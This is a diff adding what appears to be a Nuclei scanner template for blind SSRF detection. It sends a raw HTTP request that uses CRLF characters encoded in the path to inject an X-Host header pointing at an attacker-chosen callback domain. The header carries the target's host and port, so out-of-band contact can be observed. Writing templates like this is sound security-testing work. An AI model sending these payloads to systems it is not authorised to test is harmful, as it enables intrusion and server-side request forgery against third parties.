@@ -1,0 +1,23 @@
+id: 0x107
+
+info:
+  name: Blind SSRF
+  author: 0xAwali
+  severity: info
+
+requests:
+  - raw:
+    - |+
+      GET /%20HTTP/1.1%0d%0aX-Host:%20{{Host}}.{{Port}}.BSSRF-107.{{MY-DOMAIN}}%0d%0a%0d%0a HTTP/1.1
+      Host: {{Hostname}}
+      Cache-Control: no-transform
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Your Match"
